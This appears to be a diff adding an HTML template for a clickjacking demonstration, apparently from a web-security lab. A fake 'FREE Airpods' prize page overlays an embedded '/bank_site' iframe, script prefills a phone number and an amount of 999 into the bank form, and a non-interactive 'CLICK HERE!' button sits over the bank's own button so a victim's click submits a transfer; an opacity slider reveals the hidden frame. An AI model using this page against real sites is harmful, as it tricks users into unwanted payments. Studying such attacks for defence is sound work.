@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Congratulations!</title>
+
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <style>
+        iframe {
+            z-index: 1;
+        }
+
+        #opacity-slider {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            width: 200px;
+        }
+
+        #overlay-button {
+            position: absolute;
+            top: 54.7%;
+            left: 0.7%;
+            z-index: 10;
+            width: 20%
+        }
+
+        #overlay-navbar-and-fields {
+            position: absolute;
+            top: 5%;
+            z-index: 10;
+            width: full;
+            height: 470px;
+        }
+    </style>
+    <script>
+	// document.HTMLDocument = "http://localhost:5000/";
+	// document.baseURI = "http://localhost:5000/";
+	// document.documentURI = "http://localhost:5000/";
+	// document.location = Location("http://localhost:5000/");
+
+        // Call the function when the window has loaded
+        window.onload = () => {
+            var iframe = document.getElementById('banking_iframe');
+            var iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
+
+            // Accessing form elements by name or id and setting their values
+            iframeDocument.getElementById('phone').value = '9406296024';
+            iframeDocument.getElementById('amount').value = '999';
+
+            // Initialize the slider position based on the iframe's initial opacity.
+            var slider = document.getElementById('opacity-slider');
+            slider.value = iframe.style.opacity * 100;
+
+            // Function to update the opacity of the iframe and the body
+            function updateOpacity(value) {
+                iframe.style.opacity = value / 100;
+            }
+
+            // Set the oninput event for the slider to update opacities
+            slider.oninput = (e) => {
+                updateOpacity(e.target.value);
+            };
+
+            // Initialize opacities
+            updateOpacity(slider.value);
+
+        }
+    </script>
+</head>
+<body class="bg-black/5">
+    <iframe id="banking_iframe" src="/bank_site" width="500" height="700" scrolling="no"></iframe>
+
+    <!-- Make iframe nav-bar and input-fields non-interactive -->
+    <div id="overlay-navbar-and-fields">
+        <div class="animate-bounce">
+            <h1 class="text-2xl ml-2"><strong class="animate-pulse text-3xl font-black">Congratulations</strong>! You have won a <strong class="font-bold text-3xl text-red-600">FREE Airpods</strong> set...</h1>
+        </div>
+        <img src="{{ url_for('static', filename='assets/gif/airpods_pro.gif') }}" alt="Airpods Pro" class="mt-5 ml-5 rounded-xl shadow-xl">
+        <h1 class="text-md ml-4 mt-5">You are one of very few people to win this prize!!!</h1>
+        <h1 class="text-xl ml-4"><strong>NOTE</strong>: Click the following button to get your <strong class="animate-ping text-3xl">Airpods Pro</strong> delivered to your address...</h1>
+    </div>
+
+    <!-- Clickjacking button -->
+    <div id="overlay-button" style="pointer-events: none;">
+        <button class="bg-blue-400 block w-full rounded py-4 text-white font-bold shadow">CLICK HERE!</button>
+    </div>
+
+    <!-- Slider for adjusting opacity -->
+    <input type="range" id="opacity-slider" min="0" max="100" title="Adjust Opacity">
+</body>
+</html>
